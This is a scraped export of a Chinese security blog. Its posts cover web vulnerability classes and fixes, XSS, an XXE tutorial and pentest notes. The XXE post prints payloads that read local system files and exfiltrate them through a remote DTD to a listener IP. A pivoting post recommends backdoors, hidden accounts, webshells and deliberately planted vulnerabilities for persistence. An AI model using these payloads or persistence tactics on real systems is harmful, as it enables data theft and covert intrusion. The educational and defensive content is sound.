0x03 json劫持防御1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。3、严格过滤 callback 函数名及 JSON 里数据的输出。4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。 摘自：http://blog.knownsec.com/2015/03/jsonp_security_technic/","link":"/2019/01/31/json%E5%8A%AB%E6%8C%81/"},{"title":"web中间件漏洞","text":"人能知道什么呢————过去是一片迷雾，吐出一个接一个幽灵，现在是以时速九十英里在高速公路上风驰电掣，将来是深不见底的黑洞，任何猜测都是徒劳的。 ——本·方登《漫长的中场休息》 IISIIS解析漏洞IIS 6.0解析利用方法有两种：1.目录解析建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析2.文件解析后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)3.默认解析：/xx.asa，/xx.cer，/xx.cdxIIS7.5/ IIS 7.0/ Nginx &lt;8.03畸形解析漏洞IIS 7.5的解析漏洞利用手法，在正常图片URL后添加 /.php 常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾内容","link":"/2019/02/13/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"title":"WEB常见漏洞问题危害及修复建议(转载)","text":"我着迷于机场，因为那里的一切都劝诱着我们出走、离开。我幻想着在航站楼里度过余生。我的旅行总是以逃离开始，以对时间的追逐而结束。 ——西尔万·泰松《在西伯利亚森林中》 0x00 高危漏洞高危漏洞包括SQL注入漏洞、XSS跨站脚本漏洞、页面存在源代码泄露、网站存在备份文件、网站存在包含SVN信息的文件、网站存在Resin任意文件读取漏洞。 SQL注入漏洞：网站程序忽略了对输入字符串中包含的SQL语句的检查，使得包含的SQL语句被数据库误认为是合法的SQL指令而运行，导致数据库中各种敏感数据被盗取、更改或删除。 XSS跨站脚本漏洞：网站程序忽略了对输入字符串中特殊字符与字符串（如&lt;&gt;'&quot;&lt;script&gt;&lt;iframe&gt;onload）的检查，使得攻击者可以欺骗用户访问包含恶意JavaScript代码的页面，使得恶意代码在用户浏览器中执行，从而导致目标用户权限被盗取或数据被篡改。 页面存在源代码泄露：页面存在源代码泄露,可能导致网站服务的关键逻辑、配置的账号密码泄露，攻击者利用该信息可以更容易得到网站权限，导致网站被黑。 网站存在备份文件：网站存在备份文件，例如数据库备份文件、网站源码备份文件等，攻击者利用该信息可以更容易得到网站权限，导致网站被黑。 网站存在包含SVN信息的文件：网站存在包含SVN信息的文件，这是网站源码的版本控制器私有文件，里面包含SVN服务的地址、提交的私有文件名、SVN用户名等信息，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 网站存在Resin任意文件读取漏洞：安装某些版本Resin服务器的网站存在可读取任意文件的漏洞，攻击者利用该漏洞可以读取网站服务器的任意文件内容，导致网站被黑。 0x01 中危漏洞中危漏洞包括网站存在目录浏览漏洞、网站存在PHPINFO文件、网站存在服务器环境探针文件、网站存在日志信息文件、网站存在JSP示例文件。 网站存在目录浏览漏洞：网站存在配置缺陷，存在目录可浏览漏洞，这会导致网站很多隐私文件与目录泄露，比如数据库备份文件、配置文件等，攻击者利用该信息可以更容易得到网站权限，导致网站被黑。 网站存在PHPINFO文件：网站存在PHPINFO文件，这个是PHP特有的信息文件，会导致网站的大量架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 网站存在服务器环境探针文件：网站存在服务器环境探针文件，该文件会导致网站的大量架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 网站存在日志信息文件：网站存在日志信息文件，该文件包含的错误信息会导致网站的一些架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 网站存在JSP示例文件：网站存在JSP示例文件，该文件的弱口令会导致网站的大量架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 0x02 低危漏洞低危漏洞包括页面上存在网站程序的调试信息、网站存在后台登录地址、网站存在服务端统计信息文件、网站存在敏感目录。 页面上存在网站程序的调试信息：页面上存在数据库信息，例如数据库名、数据库管理员名，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 网站存在后台登录地址：网站存在后台登录地址，攻击者经常使用这个地址进行网站的后台登陆，比如弱密码、表单绕过、暴力破解等，从而得到网站的权限。 网站存在服务端统计信息文件：网站存在服务端统计信息文件，该文件会导致网站的一些架构信息泄露，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 网站存在敏感目录：网站存在敏感目录，例如 /upload /database /bak，该信息有助于攻击者更全面了解网站的架构，为攻击者入侵网站提供帮助。 0x03 漏洞的危害SQL注入漏洞的危害不仅体现在数据库层面，还有可能危及承载数据库的操作系统；如果SQL注入被用来挂马，还可能用来传播恶意软件等，这些危害包括但不限于： • 数据库信息泄漏：数据库中存储的用户隐私信息泄露。 • 网页篡改：通过操作数据库对特定网页进行篡改。 • 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。 • 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。 • 服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。 • 破坏硬盘数据，瘫痪全系统。XSS跨站脚本漏洞的危害包括但不限于： • 钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。 • 网站挂马：跨站后利用IFrame嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。 • 身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取用户的Cookie，从而利用该Cookie获取用户对该网站的操作权限。如果一个网站管理员用户Cookie被窃取，将会对网站引发巨大的危害。 • 盗取网站用户信息：当能够窃取到用户Cookie从而获取到用户身份时，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。 • 垃圾信息发送：比如在SNS社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群体。 • 劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，监视用户的浏览历史，发送与接收的数据等等。 • XSS蠕虫：XSS 蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等。信息泄露漏洞的危害 CGI漏洞大多分为以下几种类型：信息泄露、命令执行和溢出，因此危害的严重程度不一。信息泄露会暴露服务器的敏感信息，使攻击者能够通过泄露的信息进行进一步入侵；命令执行会对服务器的安全造成直接的影响，如执行任意系统命令；溢出往往能够让攻击者直接控制目标服务器，危害重大。 内容泄露漏洞：会被攻击者利用导致其它类型的攻击，危害包括但不局限于： • 内网ip泄露：可能会使攻击者渗透进入内网产生更大危害。 • 数据库信息泄露：让攻击者知道数据库类型，会降低攻击难度。 • 网站调试信息泄露：可能让攻击者知道网站使用的编程语言，使用的框架等，降低攻击难度。 • 网站目录结构泄露：攻击者容易发现敏感文件。 • 绝对路径泄露：某些攻击手段依赖网站的绝对路径，比如用SQL注入写webshell。 • 电子邮件泄露：邮件泄露可能会被垃圾邮件骚扰，还可能被攻击者利用社会工程学手段获取更多信息，扩大危害。 文件泄露漏洞：可能会导致重要信息的泄露，进而扩大安全威胁，这些危害包括但不局限于： • 帐号密码泄漏：可能导致攻击者直接操作网站后台或数据库，进行一些可能有危害的操作。 • 源码泄露：可能会让攻击者从源码中分析出更多其它的漏洞，如SQL注入，文件上传，代码执行等。 • 系统用户泄露：可能会方便暴力破解系统密码。0x04漏洞解决方案SQL注入漏洞解决方案： 1.解决SQL注入漏洞的关键是对所有来自用户输入的数据进行严格检查、对数据库配置使用最小权限原则 2.所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。 3.对进入数据库的特殊字符（&apos;&quot;\\&lt;&gt;&amp;*;等）进行转义处理，或编码转换。 4.确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 5.数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 6.网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 7.严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。 8.避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 9.在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。XSS跨站脚本漏洞解决方案： 1.假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 2.不要仅仅验证数据的类型，还要验证其格式、长度、范围和内容。 3．不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 4．对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。 5．在网站发布之前建议测试所有已知的威胁。页面存在源代码泄露解决方案： 1.配置好服务端语言解析，防止解析失败而导致源码泄露； 2.关闭网站错误调试机制，防止因为报错而导致源码泄露。网站存在备份文件解决方案：删除检测出的备份文件，或者将这类文件从网站目录下移走。 网站存在包含SVN信息的文件解决方案：删除网站目录下的SVN信息，不要使用SVN目录作为网站的目录。 网站存在Resin任意文件读取漏洞解决方案：删除resin_doc相关目录与文件。 网站存在目录浏览漏洞：关闭Web容器（如IIS/Apache等）的目录浏览功能，比如： 1.IIS中关闭目录浏览功能：在IIS的网站属性中，勾去“目录浏览”选项，重启IIS； 2.Apache中关闭目录浏览功能：打开Apache配置文件httpd.conf，查找 “Options Indexes FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消)，保存退出，重启Apache。网站存在PHPINFO文件解决方案：删除检测出的PHPINFO文件。 网站存在服务器环境探针文件解决方案：删除检测出的探针文件，比如：iprober.php、phpcheck.php、jspcheck.jsp、DotNetInfo.aspx、aspcheck.asp等。 网站存在日志信息文件解决方案：删除检测出的日志信息文件。 网站存在JSP示例文件解决方案：删除JSP示例文件。 页面上存在数据库信息解决方案：关闭数据库的错误调试机制，防止因为SQL语句错误导致数据库报错信息显示到页面上。 页面上存在网站程序的调试信息解决方案：关闭网站程序的调试机制，这个机制经常被用于网站的测试调试，该机制能显示出很详细的网站报错信息。 网站存在后台登录地址解决方案： 1.将后台登录地址隐藏，改个不容易猜到的路径； 2.配置好后台登录地址的访问权限，比如只允许某个IP或IP段的用户访问。网站存在服务端统计信息文件解决方案：删除检测出的服务端统计信息文件。 网站存在敏感目录解决方案：这些目录经常用于存放敏感的文件，可以考虑从网站目录中分离出，或改个不易猜测到的路径，并配置好访问权限。 原文链接：WEB常见漏洞问题及危害和修复建议","link":"/2019/03/13/WEB%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E9%97%AE%E9%A2%98%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"},{"title":"XSS","text":"二十几岁的时候，即使你对你的目标和志向很迷茫，很不确定，你却能强烈地感受到生活本身是什么，生活中的你是什么样子，会变成怎样。后来，这种不确定性越来越多，相互交叉，前后纠缠，虚假记忆日渐增加。想当初，你能记住你短暂人生的全部。后来，记忆变成了一件百衲衣。 ——朱立安·巴恩斯《终结的感觉》 0x00 什么是XSSCSS（Cross Site Scripting，跨站脚本攻击），为了和层叠样式表（Cascading Style Sheet，CSS）区分，所以改为叫XSS。XSS攻击能让攻击者在受害者的浏览器中执行脚本，并劫持用户会话、破坏网络或将用户重定向到其他恶意的站点。 0x01 XSS原理当应用程序的网页中包含不可信的，未经恰当验证或转义的数据时，或者使用可以创建HTML或JavaScript的浏览器API更新现有的网页时，就会出现XSS漏洞。举个栗子，当你在一些网站评论或留言的时候，你输入的不是正常的留言，而是一些恶意的HTML或JavaScript代码，刚好这个网站的安全措施做得没那么好，对于用户输入的数据没有进行过滤、转义等一些安全处理，然后你的恶意代码就被浏览器执行或者上传到数据库了。 0x02 XSS分类分三种XSS类型，通常针对的都是用户的浏览器。 反射型XSS应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。通常用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告等。 存储型XSS应用程序或API间未“消毒”的的用户输入存储到了数据库，在后期在其他用户的或管理员的页面显示出来。存储型XSS一般被认为是高危或严重的漏洞。 基于DOM的XSSDOM的全称为Document Object Model,即文档对象模型。基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。这种类型的XSS会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序会API存在这类型的漏洞。反射型和存储型XSS是后端（服务器端）代码漏洞造成的，payload在响应页面中，在DOM XSS中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。 0x03 XSS预防1.使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0或React JS。了解每个框架的XSS保护的局限性，并适当的处理未覆盖的用例。2.为了避免反射型XSS和存储型XSS漏洞，最好的办法就是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的过滤、转义。3.在客户端修改浏览器文档时，为了避免DOM型XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，也可以采用类似上下文敏感的的转义技术应用浏览器的API。4.使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（如：路径遍历覆盖和允许在网络中传输的易受攻击的库），该策略是有效的。 上下文敏感（context-sensitive）在过程间分析（Interprocedural Analysis）时，考虑函数调用的上下文信息。一个子过程或函数可能会被多个过程调用，那么在不同的过程调用它的时候，对于传给它的实际参数或当时的全局变量有可能会不同，这些被称之为上下文，上下文敏感是考虑了这些不同。 CSP内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。CSP以白名单的机制对网站加载或执行的资源起作用。在网页中，这样的策略通过 HTTP 头信息或者 meta 元素定义。CSP虽然提供了强大的安全保护，但是他也造成了如下问题：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本。这些问题阻碍CSP的普及，如果要使用CSP技术保护自己的网站，开发者就不得不花费大量时间分离内嵌的JavaScript代码和做一些调整。 对于DOM的个人理解因为DOM Tree，JavaScript可以通过DOM节点对HTML或XML文档进行修改，因为JavaScript要获得HTML或XML里的元素访问的入口，就必须通过DOM对象的属性或方法。DOM技术使得用户页面可以动态地变化，如可以动态地显示或隐藏一个元素，改变它们的属性，增加一个元素等，Dom技术使得页面的交互性大大地增强。 参考文献：OWASP TOP 10 2017 10项严重的WEB应用程序安全风险","link":"/2019/11/19/XSS/"},{"title":"业务漏洞挖掘关键点","text":"设定一个可达的目标是幸福的关键。 ——谢丽尔·桑德伯格《向前一步》 0x00 身份认证安全暴力破解Cookie&amp;session加密测试 0x01 业务一致性手机号篡改邮箱和用户名更改订单ID更改商品编号更改用户ID篡改 0x02 业务数据授权是否能够修改为负数，是否不支付直接跳转到支付成功页面金额数据更改商品数量更改最大数限制突破本地js参数修改 0x03 用户输入合规性注入:sql注入、json注入、XML/Xpath注入XSSFuzz 0x04 密码找回漏洞正常访问，不同方式找回，记录各个方式找回的过程分析数据包，定位敏感信息。如哪些步骤使用了哪些身份认证，使用了哪些认证方法。分析找回机制。哪些步骤可以直接跳过，或者可以直接访问某个步骤。修改数据包验证，验证哪些方法存在缺陷，可否越权 0x05 验证码突破暴力破解时间、次数绕过回显测试绕过测试 0x06 业务授权安全未授权访问越权测试 0x07 业务流程乱序顺序执行缺陷 0x08 业务接口调用恶意注册短信炸弹内容编辑 0x09 时效绕过测试时间刷新缺陷时间范围测试","link":"/2019/01/31/%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%B3%E9%94%AE%E7%82%B9/"},{"title":"XSS攻击方法总结","text":"我没有读过大学的中文系，所以孤陋寡闻，但我以为，人活在世上，不必什么都知道，只知道最好的就够了。 ——王小波《我的精神家园》 之前看到一张关于XSS payload的图，感觉挺全的，记不起来是哪位大佬做的了，这里就站在巨人的肩膀上吧！！哈哈哈哈 【侵删】","link":"/2019/01/31/XSS%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"},{"title":"chrome浏览器关闭烦人的禁止使用停用的扩展程序和插件弹框","text":"好久没看书了，写不出来文绉绉的话了…… chrome更新后一些旧的扩展程序和插件尽管能用，但每次打开就会弹出如下图每次都要点一下关闭，很烦，强迫症也不允许。 于是乎，google一波，各种乱七八糟的，眼花缭乱的，要吐了，好在最后找到一种很简单解决方式，亲测有效。 先下载补丁包,也可以到 http://www.epinv.com/dl/12721.html 下载解压密码： www.epinv.com链接：https://pan.baidu.com/s/12N7Gat_m1y1eQfraBsHmxw提取码：6w72 解压，这里面还包含微软edge的。除此之外，修改注册表的方法没试过，评论说失败了，参考:http://www.epinv.com/post/12721.html打开google的安装位置，找到chrome.dll的目录，刚开始直接复制补丁运行是失败的。后来看了一下评论，说是要把目录复制到桌面运行补丁.exe成功之后再替换原来的目录我这里之前已经成功修改过了，所以显示失败，第一次是成功的，再打开chrome再也没烦人的弹框了！","link":"/2020/03/29/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%B3%E9%97%AD%E7%83%A6%E4%BA%BA%E7%9A%84%E7%A6%81%E6%AD%A2%E4%BD%BF%E7%94%A8%E5%81%9C%E7%94%A8%E7%9A%84%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F%E5%92%8C%E6%8F%92%E4%BB%B6%E5%BC%B9%E6%A1%86/"},{"title":"四月是你的谎言","text":"月色真美。 三四月份是踏青好时节，大家还是要多出去走走(这话我自己都不信哈哈哈哈)，有事四月停更，也好好整理一下之前的。","link":"/2019/04/01/%E5%9B%9B%E6%9C%88%E6%98%AF%E4%BD%A0%E7%9A%84%E8%B0%8E%E8%A8%80/"},{"title":"从零开始学习XXE","text":"学就学懂，不能似懂非懂。——《日常》 1 XML1.1 特点可扩展标记语言（eXtensible Markup Language）;传输、存储数据，和json类似;XML是不作为的，用来结构化数据，其焦点是数据的内容;HTML用来显示数据，其焦点是数据的外观。 1.2 XML基本结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素、属性、实体等。实体是用来定义普通文本的变量。实体引用是对实体的引用PCDATA 的意思是被解析的字符数据（parsed character data），是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。CDATA是字符数据（character data）。CDATA 是不会被解析器解析的文本。 1.3 DTD文档定义1、内部声明 12&lt;!DOCTYPE 根元素 [元素声明]&gt;ex: &lt;!DOCTYOE test any&gt; 2、外部声明当引用的是一个本地文件，用“SYSTEM”标识；当引用的是一个公共文件的时候，采用“PUBLIC”标识(暂不考虑此种情况)。 12&lt;!DOCTYPE 根元素 SYSTEM \"文件名\"&gt;ex:&lt;!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'&gt; 1.4 四种实体声明1、内部实体声明 1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT test AA &gt;&lt;!ENTITY xxe \"Hello\"&gt;]&gt;&lt;note&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;&lt;/note&gt; 2、外部实体声明 1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT test AA &gt;&lt;!ENTITY xxe SYSTEM \"test.dtd\"&gt;]&gt;&lt;note&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;&lt;/note&gt; 上述两种均为引用实体，主要在XML文档中被应用，引用方式：&amp;实体名称; 末尾要带上分号，这个引用将直接转变成实体内容。3、参数实体声明只能在DTD中使用，引用实体的方式：%实体名； 123456&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT test AA &gt;&lt;!ENTITY % xxe SYSTEM \"http://www.666.com/test.dtd\"&gt; %xxe;]&gt; 4、公共实体声明(忽略) 2 XXEXXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 触发点是上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。 是利用了DTD引用外部实体导致的漏洞。2.1 漏洞复现1(有回显)只是编写获取XML文件并解析这段php代码就花了很长时间了 1234567891011121314151617&lt;?php //顾名思义，值为True时表示禁用外部实体。可用于安全防护 libxml_disable_entity_loader(false); //获取POST来的数据 $xmlfile = file_get_contents('php://input'); //使用DomDocument解析XML $dom = DOMDocument::loadXML($xmlfile); /*也可使用以下代码 $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); */ //simplexml_import_dom()函数把DOM节点转换为SimpleXMLElement对象。 $creds = simplexml_import_dom($dom); echo $creds;?&gt; 1、读取本地文件如图利用burpsuite抓包修改请求方式，新增POST的数据为： 1234&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM \"file:///c:/windows/system.ini\"&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt; 2、内网ip探测 1234&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM \"php://filter/convert.base64-encode/resource=http://192.168.209.152\"&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt; 根据响应时间长短以及返回包判断ip是否存在。更多利用方式参考这篇 2.2 漏洞复现1(无回显)12345678910111213&lt;?php //顾名思义，值为True时表示禁用外部实体。可用于安全防护 libxml_disable_entity_loader(false); //获取POST来的数据 $xmlfile = file_get_contents('php://input'); //使用DomDocument解析XML $dom = DOMDocument::loadXML($xmlfile); /*也可使用以下代码 $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); */?&gt; 1、带外通道获取数据 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM \"192.168.1.169:8000/evil.dtd\"&gt;%remote;%int;%send;]&gt; evil2.dtd的内容： 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///c:/windows/system.ini\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.209.152:9999?p=%file;'&gt;\"&gt; 152的机器为监听机，169的为存放dtd的跳板机。 3 漏洞挖掘以及修复建议3.1 如何挖掘此类漏洞XML文件交互的地方居多，有时间的话单独另外总结一下。 3.2 防御：1.使用开发语言提供的禁用外部实体的方法 PHP:libxml_disable_entity_loader(True); Java:DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false); Python:from lxml import etree xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False))2.过滤用户提供的XML数据过滤关键字：&lt;! DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC3.不允许XML中含有自己定义的DTD 4 参考链接XXE漏洞原理","link":"/2019/10/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0XXE/"},{"title":"个人对于渗透测试的杂谈","text":"0x00 前言渗透工作也算是搞了半年吧，看看自己能不能挤点墨水出来，说一下我自己对渗透测试的理解。 2019.03.06更新线—- 好吧，不能 之前一位大佬说过web安全重点就是系统的数据输出输出点，这些点就是漏洞挖掘的重点关注对象，又一位大佬说渗透的实质是代码注入+服务器解析器解析。当然主要针对的是Web安全漏洞，逻辑漏洞又是另外一回事儿了。两位都是大佬，小菜鸡只能使劲点赞。 再说说我的工作吧。虽然是渗透测试，但在实际工作过程中我发现了一些问题: 1.信息收集不够 大多数情况就是获取到工单后直接对系统进行常见web漏洞或逻辑漏洞测试，测试周期比较短。 2.测试过程中受客户影响因素较多 客户有时候提供的信息太多或太少，不利于自主渗透过程。 3.渗透过程有局限 测试账号权限较低，客户生产环境敏感，不能执行敏感操作，有漏洞不能进行进一步利用或验证。 4.内网渗透薄弱 有时候进行内网渗透，基础技术不够熟练，内网测试起来有难度。由于涉及到公司的信息，有些话说的有点模糊，不过大概意思就那样。先简单说一下渗透测试的基本过程。 0x01 信息收集子域名收集Google/baidu Hacking其他网络安全搜索引擎： shodan：https://www.shodan.io zoomeye(钟馗之眼)：https://www.zoomeye.org Fofa：https://fofa.so Censys：https://www.censys.io Dnsdb搜索引擎：https://www.dnsdb.io其他在线查询网址： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ https://censys.io/ https://x.threatbook.cn/ 微步在线域名、内部域名、子域名猜测、扫描 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute:https://github.com/lijiejie/ Sublist3r:https://github.com/aboul3la/Sublist3r 相关域名收集B段、C段IP 工具：御剑、K8 在线查询工具： http://www.hackmall.cn/ http://www.webscan.cc/ 推荐 https://phpinfo.me/bing.phpwhois、逆向whois 站长之家:http://whois.chinaz.com 阿里云：https://whois.aliyun.com主站爬取;跨域策略文件：crossdomain.xml 其他服务器真实IP 查询ip地址所在具体位置 http://www.hao7188.com http://www.882667.comnmap扫描系统和中间件类型，端口及其服务公司主要使用什么技术及设备,同行业采用的类似系统 云WAF、安全防护、硬件WAF目录及其后台： 收集的方式有爬虫采集，目录扫描 1）使用爬虫获取网站目录结构。如wvs爬虫功能获取网站目录结构。 2）使用目录猜解工具暴力猜解。如：御剑后台扫描工具、7kbscan-WebPathBrute移动端：APP、微信公众号等在github、pastebin上是否泄露资讯、svn源码泄露、备份、测试文件泄露 0x02 漏洞挖掘系统漏洞服务器中间件漏洞常见web漏洞逻辑漏洞 工具扫描：awvs、nessus、burpsuite 模糊测试 0x03 漏洞利用工具msf网上搜索对应exp脚本在线测试网站自己编写poc、exp(要求较高) 0x04 权限维持待更新…… 0x05 内网渗透存活主机IP地址极其开放端口服务弱口令探测：ssh、ftp、telnet、数据库 系统漏洞：Nessus可以扫描系统漏洞，结合msf进行利用中间件版本、默认配置，默认密码以及是否存在常见漏洞内网web应用渗透 0x06 痕迹消除待更新…… 参考链接：https://mp.weixin.qq.com/s/B-NX3uC3hpURrf3Sjsxn5g","link":"/2019/02/19/%E4%B8%AA%E4%BA%BA%E5%AF%B9%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E6%9D%82%E8%B0%88/"},{"title":"内网渗透之跳板攻击","text":"在人生的某个时候，我们失去了对自己生活的掌控，命运主宰了我们的人生。 ——保罗·柯艾略《牧羊少年奇幻之旅》 0x00 前言前几天给客户做测试，然后发现目标服务器只能经过特定跳板机才能访问，然后跳板机上啥也没有，这我咋测啊，这不是内网渗透了嘛，小弟不才，还在炒冷饭呢。请教了一下老哥说能不能用网线到机房直连服务器，结论当然是不行。那就只能在跳板机上安装一下测试工具了，获取到客户授权后，成功完事儿！后来发现自己之前还真没遇到过这种情况，所以Google一下跳板攻击，现学现卖吧！ 0x01 维持权限维权也是一个必须的点，好不容易搞到的跳板可不能轻易丢了。维权也就是所谓的留后门，无论windows下还是linux下留后门姿势都多种多样，我也就只列举几个吧。 服务器站点可以采取构造Web漏洞方式维权。我感觉这种方式比放上个马可靠多，同时漏洞构造的隐蔽一些，让其他人给利用了就不好完了。比如可以构造复杂的文件包含漏洞包含放在某个系统目录下的木马图片来获取Shell，也可以构造SQL注入利用Sqlmap的–os-shell参数来执行Shell。 服务器站点可以使用过狗过盾的复杂马维权。复杂马的构造需要私下自己多实验多构造了。 Linux、Windows账户维权。这个方法只适合没有做LDAP或堡垒机之类的SSO统一权限管理和没有屏蔽对外端口的情况，可以利用密码读取工具读取到的密码进行保持权限，也可以自建linux隐藏账户、windows隐藏账户的方式保持权限。 工具法维权。工具概括来说就是主动反弹和被动连接两种。两种方式各有优缺点，例如：主动反弹方式既可以放在有公网IP的服务器站点也可以放在内网钓到的机子上，并且更方便规避防火墙、IPS等阻碍，但需要设定触发机制，不能做到想连就连；被动连接方式能够随时连，但无法利用在内网机子上（除非你拿了上层路由做了端口映射）。利用上例如msf生成后门、nc反弹，脚本反弹shell等。 内网渗透内网渗透基本都是依据当前所获得的网络环境进行策略制定，不同环境方式不同，但内网中能搞得也就常说的那些，在有比较靠谱的防火墙、NIDS、IPS的情况下内网就更加难搞了，时时刻刻还要提防它们。这里也就之列举一下常用的内网思路。常用套路 